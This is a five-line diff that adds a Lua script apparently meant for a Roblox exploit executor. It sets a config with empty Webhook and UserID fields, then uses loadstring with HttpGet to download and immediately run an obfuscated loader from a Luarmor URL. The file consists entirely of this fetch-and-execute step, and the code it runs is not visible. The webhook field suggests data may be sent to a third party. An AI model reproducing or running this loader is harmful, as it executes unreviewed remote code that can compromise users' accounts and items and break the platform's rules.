@@ -1,0 +1,5 @@
+getgenv().Config = {
+    ["Webhook"] = "",
+    ["UserID"] = "",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/563a4a1c759a83a84ed00822b66756a9.lua"))()
